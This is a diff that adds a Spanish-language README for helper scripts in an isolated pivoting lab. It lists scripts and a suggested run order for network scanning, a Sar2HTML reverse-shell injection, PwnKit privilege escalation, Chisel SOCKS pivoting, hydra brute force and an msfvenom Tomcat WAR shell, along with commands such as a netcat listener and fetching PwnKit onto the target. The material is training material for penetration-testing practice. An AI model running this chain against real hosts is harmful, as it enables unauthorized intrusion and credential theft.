@@ -1,0 +1,66 @@
+# Scripts del laboratorio de Pivoting
+
+Scripts auxiliares que automatizan los comandos usados durante el writeup
+principal ([../README.md](../README.md)). Cada script es independiente y
+acepta argumentos por línea de comandos; ejecútalo sin argumentos para ver
+el uso.
+
+| Script | Fase | Descripción |
+|---|---|---|
+| `01_recon.sh` | Descubrimiento | `arp-scan` + `nmap -sV -Pn -sS -O -n` contra un objetivo |
+| `02_exploit_sar2html.sh` | Explotación inicial | Inyección de reverse shell vía CVE-2025-34030 (Sar2HTML) |
+| `03_pwnkit_setup.sh` | Escalada de privilegios | Clona y sirve PwnKit (CVE-2021-4034) por HTTP |
+| `04_add_proxychain.sh` | Pivoting | Añade un nuevo `socks5 127.0.0.1 <puerto>` a `proxychains4.conf` |
+| `05_chisel_server.sh` | Pivoting | Levanta un servidor Chisel en modo `--reverse` |
+| `06_chisel_client.sh` | Pivoting | Conecta un cliente Chisel exponiendo SOCKS en el servidor |
+| `07_host_discovery.sh` | Enumeración | Descubrimiento de hosts vivos por ping en una subred /24 |
+| `08_bruteforce.sh` | Acceso por credenciales | Fuerza bruta SSH / HTTP Basic Auth con `hydra` vía proxychains |
+| `09_web_enum.sh` | Enumeración web | Fuzzing de directorios con `gobuster` o `dirb` vía proxy |
+| `10_tomcat_war_shell.sh` | Explotación | Genera un WAR reverse shell con `msfvenom` para Tomcat Manager |
+
+## Requisitos previos
+
+- `arp-scan`, `nmap`, `curl`, `wget`
+- `chisel` (binario, x86-64 y/o 32 bits según la máquina objetivo)
+- `proxychains4` (`/etc/proxychains4.conf`)
+- `hydra`, `gobuster`, `dirb`
+- `msfvenom` (Metasploit Framework)
+- Acceso `sudo` para los scripts que lo requieren (`01_recon.sh`, `04_add_proxychain.sh`)
+
+## Dar permisos de ejecución
+
+```bash
+chmod +x *.sh
+```
+
+## Orden de uso sugerido (ejemplo VM1)
+
+```bash
+# 1. Descubrimiento y escaneo
+./01_recon.sh eth1 10.0.2.8 ../vm1
+
+# 2. Explotación inicial (en otra terminal, antes: nc -lnvp 4444)
+./02_exploit_sar2html.sh 10.0.2.8 10.0.2.14 4444
+
+# 3. Tras obtener shell, escalar con PwnKit
+./03_pwnkit_setup.sh ../vm1 8080
+# (en la máquina objetivo: wget + chmod +x + ./PwnKit)
+
+# 4. Levantar pivote con Chisel
+./05_chisel_server.sh ./chisel 9000
+# (en la máquina objetivo: ./chisel client <IP>:9000 R:socks)
+
+# 5. Añadir el proxy a proxychains
+sudo ./04_add_proxychain.sh 1080
+
+# 6. Descubrir hosts en la nueva red (desde la pivote)
+./07_host_discovery.sh 10.0.3
+
+# 7. Enumeración y fuerza bruta sobre el nuevo host
+./09_web_enum.sh gobuster http://10.0.3.5 /usr/share/wordlists/dirb/common.txt 1080
+./08_bruteforce.sh ssh ubuntu ./diccionario.txt 10.0.3.5
+```
+
+> **Nota:** estos scripts están pensados para un entorno de laboratorio
+> aislado y controlado. No los uses contra sistemas sin autorización
+> explícita.
